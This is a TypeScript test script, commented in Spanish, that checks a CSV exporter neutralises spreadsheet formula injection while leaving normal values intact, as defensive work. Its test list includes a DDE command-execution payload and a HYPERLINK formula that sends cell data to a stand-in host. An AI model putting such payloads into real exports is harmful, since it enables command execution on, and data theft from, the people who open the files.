// ─────────────────────────────────────────────────────────────────────────────
// Verificación de la NEUTRALIZACIÓN de fórmulas al exportar CSV (CSV/formula injection).
// Sin BD, sin llaves: es lógica pura.
//
// El vector: los datos vienen de un archivo que subió el cliente. Si una celda trae `=...`, al
// abrir la salida en Excel/Sheets no se ve texto — se EVALÚA. Aquí se prueba que ninguna de las
// formas de abrir fórmula sobrevive, y —igual de importante— que los datos normales NO se rompen:
// una neutralización que convierte -500 en texto arruina el reporte por el que pagaron.
//   npm run verify:csv
// ─────────────────────────────────────────────────────────────────────────────
import { neutralizarCelda, aCsv } from "../src/salida/csv.ts";

let ok = true;
const check = (n: string, p: boolean) => { console.log(`  ${p ? "✓" : "✗"} ${n}`); ok = ok && p; };

console.log("1. Lo que Excel evaluaría queda neutralizado:");
const peligrosos: [string, string][] = [
  ["=1+1", "fórmula clásica"],
  ["=cmd|'/c calc'!A1", "ejecución de comandos vía DDE"],
  ['=HYPERLINK("http://malo.mx?d="&A1,"Da clic")', "exfiltración con hipervínculo"],
  ["+1+1", "el + también abre fórmula"],
  ["-1+1", "el - también"],
  ["@SUM(A1:A9)", "el @ también"],
  ["\t=1+1", "tabulador delante (algunas versiones lo saltan)"],
  ["\r=1+1", "retorno de carro delante"],
  ["   =1+1", "espacios delante — mirar solo el primer carácter crudo lo dejaría pasar"],
];
for (const [entrada, porque] of peligrosos) {
  const r = neutralizarCelda(entrada);
  check(`${porque}: queda como texto`, r.startsWith("'"));
}

console.log("\n2. Los datos normales NO se rompen (neutralizar de más también es un bug):");
const inocentes: [unknown, string][] = [
  ["Ana Rivera", "Ana Rivera"],
  ["-500", "-500"],           // número negativo en texto: es un dato, no una fórmula
  ["+3.5", "+3.5"],
  [1540, "1540"],
  [0, "0"],                    // el 0 no debe volverse cadena vacía
  [true, "true"],
  [null, ""],
  [undefined, ""],
  ["", ""],
  ["Conciliación de facturas", "Conciliación de facturas"],
];
for (const [entrada, esperado] of inocentes) {
  check(`${JSON.stringify(entrada)} se conserva tal cual`, neutralizarCelda(entrada) === esperado);
}

console.log("\n3. CSV bien formado (RFC 4180) y legible en Excel:");
const csv = aCsv(
  [{ campo: "vendedor", etiqueta: "Vendedor" }, { campo: "total", etiqueta: "Total" }],
  [
    { vendedor: "Ana", total: 1200 },
    { vendedor: '=1+1', total: 980 },
    { vendedor: 'Pérez, Luis "el rápido"', total: 500 },
    { vendedor: "con\nsalto", total: 0 },
  ],
);
const lineas = csv.split("\r\n");
check("empieza con BOM (sin él Excel en Windows destroza los acentos)", csv.charCodeAt(0) === 0xfeff);
check("cabecera con las etiquetas", lineas[0]?.endsWith("Vendedor,Total") === true);
check("la fórmula va neutralizada en su fila", lineas[2] === "'=1+1,980");
check("comas y comillas se entrecomillan y se duplican", lineas[3] === '"Pérez, Luis ""el rápido""",500');
check("un salto de línea dentro del campo va entrecomillado", csv.includes('"con\nsalto",0'));
check("líneas CRLF", csv.includes("\r\n"));
check("una columna sin etiqueta usa el campo", aCsv([{ campo: "x" }], []).includes("x"));

console.log("\n4. La cabecera también se neutraliza (el nombre de columna lo elige el agente):");
// Las columnas salen del PLAN, que produce un modelo a partir del spec del cliente: no son
// constantes nuestras, así que se tratan como dato igual que las celdas.
check("una etiqueta con '=' no queda como fórmula", aCsv([{ campo: "a", etiqueta: "=1+1" }], []).includes("'=1+1"));

console.log(`\n${ok ? "✓ CSV PROBADO" : "✗ FALLÓ"} — ninguna fórmula sobrevive a la exportación, los datos normales quedan intactos y el archivo abre bien en Excel.`);
process.exit(ok ? 0 : 1);
